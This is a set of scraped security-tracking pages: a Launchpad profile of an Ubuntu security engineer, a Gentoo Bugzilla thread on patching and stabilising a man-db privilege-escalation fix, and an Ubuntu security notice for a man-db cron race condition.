## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from launchpad.net_01709614_20250126_010619.html ===

[Log in / Register](https://launchpad.net/~mdeslaur/%2Blogin)

[![](https://launchpadlibrarian.net/105574979/head-2011-64px.jpg)](https://launchpad.net/~mdeslaur)

## [Marc Deslauriers](https://launchpad.net/~mdeslaur)

* Overview
* [Code](https://code.launchpad.net/~mdeslaur)
* [Bugs](https://bugs.launchpad.net/~mdeslaur)
* [Blueprints](https://blueprints.launchpad.net/~mdeslaur)
* [Translations](https://translations.launchpad.net/~mdeslaur)
* [Answers](https://answers.launchpad.net/~mdeslaur)

Ubuntu Security Engineer

* [Related packages](https://launchpad.net/~mdeslaur/%2Brelated-packages)
* [Related projects](https://launchpad.net/~mdeslaur/%2Brelated-projects)

## User information

Launchpad Id:
mdeslaur

Email:
[Log in](%2Blogin) for email information.

Member since:
2006-05-31

[![Icon of AppArmor Developers](https://launchpadlibrarian.net/65472736/toxie-14.png "Member of AppArmor Developers")](/~apparmor-dev)
[![Icon of Bluetooth](https://launchpadlibrarian.net/4683649/stock_bluetooth.png "Member of Bluetooth")](/~bluetooth)
[![Icon of Canonical Partner Developers](https://launchpadlibrarian.net/74993564/14.png "Member of Canonical Partner Developers")](/~canonical-partner-dev)
[![Icon of Edubuntu Developers](https://launchpadlibrarian.net/71879383/edubuntu-logo-only_14.png "Member of Edubuntu Developers")](/~edubuntu-dev)
[![Icon of GNOME3 Team](https://launchpadlibrarian.net/235731434/roundel14.png "Member of GNOME3 Team")](/~gnome3-team)
[![Icon of Indicator Applet Developers](https://launchpadlibrarian.net/22816053/add-notification-applet.14.png "Member of Indicator Applet Developers")](/~indicator-applet-developers)
[![Icon of Kubuntu Ninjas - Yellow belts](https://launchpadlibrarian.net/192173133/belt2-yellow3.png "Member of Kubuntu Ninjas - Yellow belts")](/~kubuntu-ninjas-yellow-belts)
[![Icon of Kubuntu Ninjas](https://launchpadlibrarian.net/31496145/icon.png "Member of Kubuntu Ninjas")](/~kubuntu-ninjas)
[![Icon of Kubuntu Package Archives](https://launchpadlibrarian.net/44411915/deb-small.png "Member of Kubuntu Package Archives")](/~kubuntu-ppa)
[![Icon of Lubuntu Code](https://launchpadlibrarian.net/704307155/lennyborg_14.png "Member of Lubuntu Code")](/~lubuntu-code)
[![Icon of Lubuntu Continuous Integration](https://launchpadlibrarian.net/704307325/lennyborg_14.png "Member of Lubuntu Continuous Integration")](/~lubuntu-ci)
[![Icon of Lubuntu Developers](https://launchpadlibrarian.net/704306355/lennyborg_14.png "Member of Lubuntu Developers")](/~lubuntu-dev)
[![Icon of Lubuntu Packages Team](https://launchpadlibrarian.net/704305879/lenny_bug_14.png "Member of Lubuntu Packages Team")](/~lubuntu-packaging)
[![Icon of Lubuntu](https://launchpadlibrarian.net/357050187/14.png "Member of Lubuntu")](/~lubuntu-desktop)
[![Icon of Martin Pitt's fan](https://launchpadlibrarian.net/16410730/immaginexz0.png "Member of Martin Pitt's fan")](/~we-love-pitti)
[![Icon of MOTU](https://launchpadlibrarian.net/1516491/motu-image-2.png "Member of MOTU")](/~motu)
[![Icon of Network-manager](https://launchpadlibrarian.net/11610188/nm-team.png "Member of Network-manager")](/~network-manager)
[![Icon of OEM Archive Admins](https://launchpadlibrarian.net/31251458/oem-admin-logo_14x14.png "Member of OEM Archive Admins")](/~oem-archive)
[![Icon of Soren's Target Audience](https://launchpadlibrarian.net/20548684/golf.png "Member of Soren's Target Audience")](/~sorens-target-audience)
[![Icon of Super Friends](https://launchpadlibrarian.net/134634591/superman14.png "Member of Super Friends")](/~super-friends)
[![Icon of Ubuntu 64-bit](https://launchpadlibrarian.net/17575026/x2_amd2.png "Member of Ubuntu 64-bit")](/~64-bit)
[![Icon of Ubuntu Bug Control](https://launchpadlibrarian.net/4423778/qa-icon.png "Member of Ubuntu Bug Control")](/~ubuntu-bugcontrol)
[![Icon of Ubuntu Canada](https://launchpadlibrarian.net/3600006/Ubuntu_Canada_logo.png "Member of Ubuntu Canada")](/~ubuntu-ca)
[![Icon of Ubuntu Chumby Hackers](https://launchpadlibrarian.net/27381132/14.jpg "Member of Ubuntu Chumby Hackers")](/~ubuntu-chumby-hackers)
[![Icon of Ubuntu Contributing Developers](https://launchpadlibrarian.net/17290192/wrench_emblem-trans.png "Member of Ubuntu Contributing Developers")](/~ubuntu-developer-members)
[![Icon of Ubuntu Core Development Team](https://launchpadlibrarian.net/1072365/main.png "Member of Ubuntu Core Development Team")](/~ubuntu-core-dev)
[![Icon of Ubuntu Development Team](https://launchpadlibrarian.net/1072363/motu.png "Member of Ubuntu Development Team")](/~ubuntu-dev)
[![Icon of Ubuntu Documentation Project Team](https://launchpadlibrarian.net/162165522/ubuntu-doc.png "Member of Ubuntu Documentation Project Team")](/~ubuntu-doc)
[![Icon of Ubuntu GNOME Developers](https://launchpadlibrarian.net/254356645/roundel14.png "Member of Ubuntu GNOME Developers")](/~ubuntu-gnome-dev)
[![Icon of Ubuntu GNOME](https://launchpadlibrarian.net/258611022/ubuntu-gnome_14.png "Member of Ubuntu GNOME")](/~ubuntu-gnome)
[![Icon of Ubuntu Kylin Members](https://launchpadlibrarian.net/444398797/623185830.jpg "Member of Ubuntu Kylin Members")](/~ubuntukylin-members)
[![Icon of Ubuntu Local Community Teams](https://launchpadlibrarian.net/162222905/locoteams-icon.png "Member of Ubuntu Local Community Teams")](/~locoteams)
[![Icon of Ubuntu LXC Security team](https://launchpadlibrarian.net/673452720/14.png "Member of Ubuntu LXC Security team")](/~ubuntu-lxc-security)
[![Icon of Ubuntu MATE Developers](https://launchpadlibrarian.net/212349832/icon.png "Member of Ubuntu MATE Developers")](/~ubuntu-mate-dev)
[![Icon of Ubuntu Members](https://launchpadlibrarian.net/606495581/CoF%2014px.png "Member of Ubuntu Members")](/~ubuntumembers)
[![Icon of Ubuntu Phone](https://launchpadlibrarian.net/130028485/Icon.png "Member of Ubuntu Phone")](/~ubuntu-phone)
[![Icon of Ubuntu Push Notifications Developers](https://launchpadlibrarian.net/146910341/manpush_icon.png "Member of Ubuntu Push Notifications Developers")](/~ubuntu-push-devs)
[![Icon of Ubuntu Security Team](https://launchpadlibrarian.net/1575441/Lock.png "Member of Ubuntu Security Team")](/~ubuntu-security)
[![Icon of Ubuntu Sponsors](https://launchpadlibrarian.net/40794090/minitools.png "Member of Ubuntu Sponsors")](/~ubuntu-sponsors)
[![Icon of Ubuntu Studio Development](https://launchpadlibrarian.net/479050820/14.png "Member of Ubuntu Studio Development")](/~ubuntustudio-dev)
[![Icon of Xubuntu Artwork](https://launchpadlibrarian.net/341831649/icon_optimized_14.png "Member of Xubuntu Artwork")](/~xubuntu-art)
[![Icon of Xubuntu Developers](https://launchpadlibrarian.net/139019912/x-dev.png "Member of Xubuntu Developers")](/~xubuntu-dev)

Signed Ubuntu Code of Conduct:
Yes

Languages:

English, English (Canada), French

OpenPGP keys:

50C4A0DDCF31E452CEB19B516569D855A744BE93

SSH keys:

[mdeslaur](%2Bsshkeys)

Time zone:

America/Montreal
(UTC-0500)

Karma:
[15125](https://launchpad.net/~mdeslaur/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

Social accounts:
![IRC](/@@/social-irc "IRC")
**mdeslaur**
 on
**irc.libera.chat**

## [All bugs in progress](https://launchpad.net/~mdeslaur/%2Bassignedbugs?search=Search&field.status=In+Progress) Assigned bugs

||  | #2014052 [[Lunar FFE]: Samba 4.18.1, 4.17.7 and 4.16.10 Security Releases](https://bugs.launchpad.net/ubuntu/focal/%2Bsource/samba/%2Bbug/2014052) |  |
| --- | --- | --- |
| in [Ubuntu](/ubuntu) | | |

| --- | --- | --- | --- | --- | --- |
||  | #2014052 [[Lunar FFE]: Samba 4.18.1, 4.17.7 and 4.16.10 Security Releases](https://bugs.launchpad.net/ubuntu/jammy/%2Bsource/samba/%2Bbug/2014052) |  |
| --- | --- | --- |
| in [Ubuntu](/ubuntu) | | |

## [All assigned blueprints](/~mdeslaur/%2Bspecs?role=assignee) Assigned blueprints

| **[Security Catch-all](https://blueprints.launchpad.net/ubuntu/%2Bspec/security-p-catch-all "security-p-catch-all")** for **Ubuntu**  Implement various additional security things that don't need a full blueprint of their own. Some or all of this will be discussed in the morning roundtable discussions. | |
| --- | --- |
| **[2-Factor Authentication](https://blueprints.launchpad.net/ubuntu/%2Bspec/security-o-2factor-auth "security-o-2factor-auth")** for **Ubuntu**  Discuss how to implement sensible and friendly two-factor authentication into Ubuntu. | |
| **[Easier installation of security updates](https://blueprints.launchpad.net/ubuntu/%2Bspec/security-m-easier-security-updates "security-m-easier-security-updates")** for **Ubuntu**  This session will discuss ways to get security updates installed quickly and easily. | |

## Personal package archives

| [HandBrake](/~mdeslaur/%2Barchive/ubuntu/handbrake) |
| --- |
| [ScaleRes Indicator](/~mdeslaur/%2Barchive/ubuntu/indicator-scaleres) |
| [indicator-spotify](/~mdeslaur/%2Barchive/ubuntu/indicator-spotify) |
| [pasaffe](/~mdeslaur/%2Barchive/ubuntu/pasaffe) |
| [PPA for Marc Deslauriers](/~mdeslaur/%2Barchive/ubuntu/ppa) |
| [Screen locking issues](/~mdeslaur/%2Barchive/ubuntu/screen-locking) |
| [SteamOS](/~mdeslaur/%2Barchive/ubuntu/steamos) |
| [testing](/~mdeslaur/%2Barchive/ubuntu/testing) |

## [All memberships](https://launchpad.net/~mdeslaur/%2Bparticipation) Latest memberships

| [Ubuntu Security Leadership](/~ubuntu-security-leaders)  Joined on 2024-10-29 | |
| --- | --- |
| [Canonical Kernel Security Team](/~canonical-kernel-security-team)  Joined on 2021-01-20 | |

## [Recent activities](https://launchpad.net/~mdeslaur/%2Bkarma) Most active in

| [Ubuntu](/ubuntu) |  |  |  |  |
| --- | --- | --- | --- | --- |
| [Ubuntu CVE Tracker](/ubuntu-cve-tracker) |  |  |  |  |
| [Tools used by the Ubuntu QA Team](/ubuntu-qa-tools) |  |  |  |  |
| [ubuntu-security-tools](/ubuntu-security-tools) |  |  |  |  |
| [QA Regression Testing](/qa-regression-testing) |  |  |  |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.gentoo.org_401cbdd6_20250126_010620.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 602588
<sys-apps/man-db-2.7.6.1-r2: privilege escalation
Last modified: 2018-07-29 22:25:48 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=602588&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=602588&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 602588**](show_bug.cgi?id=602588)
- <sys-apps/man-db-2.7.6.1-r2: privilege escalation

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
<sys-apps/man-db-2.7.6.1-r2: privilege escalation

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Security | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Vulnerabilities ([show other bugs](buglist.cgi?component=Vulnerabilities&product=Gentoo%20Security&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | Normal major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Security | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | [https://lists.nongnu.org/archive/html...](https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html) | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | B1 [glsa cve] | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2016-12-13 23:26 UTC by Ian Zimmerman | | --- | --- | | Modified: | 2018-07-29 22:25 UTC ([History](show_activity.cgi?id=602588)) | | CC List: | 2 users (show)  base-system miro.rovis | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") | * [CVE-2018-25078](show_bug.cgi?id=662438 "RESOLVED FIXED - <sys-apps/man-db-2.8.5: root privilege escalation through setuid executable and cron job") | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") | =sys-apps/man-db-2.7.6.1-r2 | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | | Flags: | stable-bot: sanity-check+ | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [Add an attachment](attachment.cgi?bugid=602588&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=602588&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Ian Zimmerman    2016-12-13 23:26:27 UTC  ``` Two privilege escalation issues have been fixed by the newest upstream release of man-db, namely man-db-2.7.6.  The problem descriptions are here:  <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>  <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>  Of these, the first one *may* be specific to Debian.  The second one is definitely relevant to gentoo as well; moreover, I feel that it is a problem that gentoo (unlike Debian) supports no way of removing setuid/setgid bits on man-db related files completely.  These bits seem to exist for only one purpose: on the fly generation of preformatted cat pages, something not needed by the vast majority of modern installations.   Reproducible: Always ```  [Comment 1](#c1)  Ian Zimmerman    2016-12-13 23:27:37 UTC  ``` Debian bug report, for tracking the fix:  <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=840357> ```  [Comment 2](#c2)  Thomas Deutschmann (RETIRED)   gentoo-dev  2016-12-15 00:31:47 UTC  ``` This is _not_ CVE-2015-1336 which was handled in [bug 568968](show_bug.cgi?id=568968 "RESOLVED INVALID - sys-apps/man-db: TOCTOU bug when processing catman pages").   @ Maintainer(s): Can we stabilize =sys-apps/man-db-2.7.6.1-r1? ```  [Comment 3](#c3)  SpanKY   gentoo-dev  2016-12-15 14:56:46 UTC  ``` it is not ready to go stable  that said, this bug isn't exactly a high priority.  it's an escalation from the "man" user which itself is not directly accessible.  so while we should fix it, it's not like people can abuse this w/out some other bug. ```  [Comment 4](#c4)  Thomas Deutschmann (RETIRED)   gentoo-dev  2016-12-15 16:20:57 UTC  ``` The severity is based on the B1 rating which is defined at <https://www.gentoo.org/support/security/vulnerability-treatment-policy.html>  It is B rated because the package isn't present on at least 1/20 Gentoo installs, however its default installation is affected. It is 1 rated because in the end it is allowing root compromise once you have local access. The fact that the man user isn't directly accessible doesn't affect security rating. Our rating maybe isn't perfect but until we a have a better policy we have to follow the current policy in place. ```  [Comment 5](#c5)  SpanKY   gentoo-dev  2016-12-15 16:51:16 UTC  ``` (In reply to Thomas Deutschmann from [comment #4](show_bug.cgi?id=602588#c4))  how you want to manage the ratings is fine -- that doesn't matter to me.  i'm just saying that this isn't a high priority to get fix & stabilized because of its real world impact (or lack there of). ```  [Comment 6](#c6)  Thomas Deutschmann (RETIRED)   gentoo-dev  2017-01-09 19:03:01 UTC  ``` @ Arches,  please test and mark stable: =sys-apps/man-db-2.7.6.1-r1 ```  [Comment 7](#c7)  Agostino Sarubbo   gentoo-dev  2017-01-10 14:56:41 UTC  ``` amd64 stable ```  [Comment 8](#c8)  Agostino Sarubbo   gentoo-dev  2017-01-10 15:25:21 UTC  ``` x86 stable ```  [Comment 9](#c9)  Agostino Sarubbo   gentoo-dev  2017-01-11 10:52:28 UTC  ``` sparc stable ```  [Comment 10](#c10)  Markus Meier   gentoo-dev  2017-01-13 16:56:40 UTC  ``` arm stable ```  [Comment 11](#c11)  Agostino Sarubbo   gentoo-dev  2017-01-15 16:04:35 UTC  ``` ppc stable ```  [Comment 12](#c12)  Tobias Klausmann (RETIRED)   gentoo-dev  2017-01-15 22:20:52 UTC  ``` Stable on alpha. ```  [Comment 13](#c13)  Jeroen Roovers (RETIRED)   gentoo-dev  2017-01-17 00:05:59 UTC  ``` Stable for HPPA. ```  [Comment 14](#c14)  Agostino Sarubbo   gentoo-dev  2017-01-17 14:40:09 UTC  ``` ia64 stable ```  [Comment 15](#c15)  Agostino Sarubbo   gentoo-dev  2017-01-18 10:05:42 UTC  ``` ppc64 stable.  Maintainer(s), please cleanup. Security, please add it to the existing request, or file a new one. ```  [Comment 16](#c16)  Lars Wendler (Polynomial-C) (RETIRED)   gentoo-dev  2017-01-18 16:06:06 UTC  ``` commit e91b4b2dc9092134cc73fb81b9cacdfa46cce477 Author: Lars Wendler <polynomial-c@gentoo.org> Date:   Wed Jan 18 17:02:09 2017      sys-apps/man-db: Security cleanup ([bug #602588](show_bug.cgi?id=602588 "RESOLVED FIXED - <sys-apps/man-db-2.7.6.1-r2: privilege escalation")).      Package-Manager: Portage-2.3.3, Repoman-2.3.1 ```  [Comment 17](#c17)  Thomas Deutschmann (RETIRED)   gentoo-dev  2017-01-18 17:01:05 UTC  ``` New GLSA request filed. ```  [Comment 18](#c18)  Thomas Deutschmann (RETIRED)   gentoo-dev  2017-02-16 19:17:42 UTC  ``` @ Maintainer(s): While writing the GLSA I re-read upstream changes (from $URL) and noticed  > * SECURITY: Eliminate dangerous setgid-root directories.  In the default >   configuration, cache files and directories are now owned by man:man >   rather than man:root; man and mandb are now setgid man as well as >   setuid man (except in the --disable-setuid case).  This is a much >   simpler and safer solution to the original problem that caused my >   predecessor to make directories setgid root, and doesn't introduce any >   interesting new privilege since the man group's only real purpose is >   to be the man user's primary group and nothing in cache directories is >   group-writeable. >  >   Maintainers of distribution packagers should take care to review their >   installation rules in light of this change.  Looks like we missed the last paragraph. The cronjob we install still do  > [...] >  > # Use same perms/settings as the ebuild. > if [ ! -d /var/cache/man ]; then >         mkdir -p /var/cache/man >         chown man:root /var/cache/man >         chmod 2755 /var/cache/man > fi >  > [...]  (see <https://gitweb.gentoo.org/repo/gentoo.git/tree/sys-apps/man-db/files/man-db.cron>)  So looks like we need another rev bump and we need to take care of existing installation (adjust permission in pkg_postinst or better remove any existing cache dir and re-create with the next cron job). ```  [Comment 19](#c19)  Robin Johnson   archtester Gentoo Infrastructure gentoo-dev Security  2017-02-21 21:47:07 UTC  ``` (In reply to Thomas Deutschmann from [comment #18](show_bug.cgi?id=602588#c18)) > So looks like we need another rev bump and we need to take care of existing > installation (adjust permission in pkg_postinst or better remove any > existing cache dir and re-create with the next cron job). Fixed in sys-apps/man-db-2.7.6.1-r2. ```  [Comment 20](#c20)  Yury German   Gentoo Infrastructure gentoo-dev  2017-02-22 01:46:56 UTC  ``` Sending it back around for stabilization to fix the missed information: Arches please test and mark stable for:  =sys-apps/man-db-2.7.6.1-r2 ```  [Comment 21](#c21)  Markus Meier   gentoo-dev  2017-03-08 20:52:27 UTC  ``` arm stable ```  [Comment 22](#c22)  Michael Weber (RETIRED)   gentoo-dev  2017-03-08 21:51:40 UTC  ``` ppc ppc64 stable. ```  [Comment 23](#c23)  Agostino Sarubbo   gentoo-dev  2017-03-10 09:10:15 UTC  ``` amd64 stable ```  [Comment 24](#c24)  Agostino Sarubbo   gentoo-dev  2017-03-10 11:00:43 UTC  ``` x86 stable ```  [Comment 25](#c25)  Agostino Sarubbo   gentoo-dev  2017-03-10 12:53:38 UTC  ``` sparc stable ```  [Comment 26](#c26)  Jeroen Roovers (RETIRED)   gentoo-dev  2017-03-11 04:42:53 UTC  ``` Stable for HPPA. ```  [Comment 27](#c27)  Agostino Sarubbo   gentoo-dev  2017-03-11 17:14:48 UTC  ``` ia64 stable ```  [Comment 28](#c28)  Yury German   Gentoo Infrastructure gentoo-dev  2017-03-24 04:51:47 UTC  ``` Ping on alpha stabilization! ```  [Comment 29](#c29)  Tobias Klausmann (RETIRED)   gentoo-dev  2017-03-24 15:02:06 UTC  ``` Stable on alpha. ```  [Comment 30](#c30)  Yury German   Gentoo Infrastructure gentoo-dev  2017-03-29 00:35:58 UTC  ``` Arches, Thank you for your work.  Maintainer(s), please drop the vulnerable version(s). ```  [Comment 31](#c31)  Yury German   Gentoo Infrastructure gentoo-dev  2017-04-05 06:07:41 UTC  ``` Maintainer(s), please drop the vulnerable version(s). ```  [Comment 32](#c32)  Lars Wendler (Polynomial-C) (RETIRED)   gentoo-dev  2017-04-05 06:25:14 UTC  ``` commit 38a67164d4b8bc37452130c45ed1a73e8188b632 Author: Lars Wendler <polynomial-c@gentoo.org> Date:   Wed Apr 5 08:24:18 2017      sys-apps/man-db: Security cleanup ([bug #602588](show_bug.cgi?id=602588 "RESOLVED FIXED - <sys-apps/man-db-2.7.6.1-r2: privilege escalation")).      Package-Manager: Portage-2.3.5, Repoman-2.3.2 ```  [Comment 33](#c33)  Yury German   Gentoo Infrastructure gentoo-dev  2017-04-05 06:29:41 UTC  ``` Including some URLs for documentation of GLSA <http://www.chiark.greenend.org.uk/~cjwatson/blog/> <http://git.savannah.gnu.org/cgit/man-db.git/log/> ```  [Comment 34](#c34)  GLSAMaker/CVETool Bot   gentoo-dev  2017-07-09 20:25:39 UTC  ``` This issue was resolved and addressed in  GLSA 201707-12 at <https://security.gentoo.org/glsa/201707-12> by GLSA coordinator Thomas Deutschmann (whissi). ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=602588)
* - [XML](show_bug.cgi?ctype=xml&id=602588)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=602588)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=602588&product=Gentoo%20Security)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=602588&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=602588&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from usn.ubuntu.com_31ab6e37_20250126_010621.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-5334-1: man-db vulnerability

17 March 2022

man-db could be made to overwrite file and directory permissions.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [man-db](/security/cves?package=man-db) - on-line manual pager

## Details

It was discovered that man-db incorrectly handled permission changing

operations in its daily cron job, and was therefore affected by a race

condition. An attacker could possibly use this issue to escalate privileges

and execute arbitrary code.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [man-db](https://launchpad.net/ubuntu/%2Bsource/man-db)
  -
  2.7.5-1ubuntu0.1~esm1
  Available with [Ubuntu Pro](/pro)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2015-1336](/security/CVE-2015-1336)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
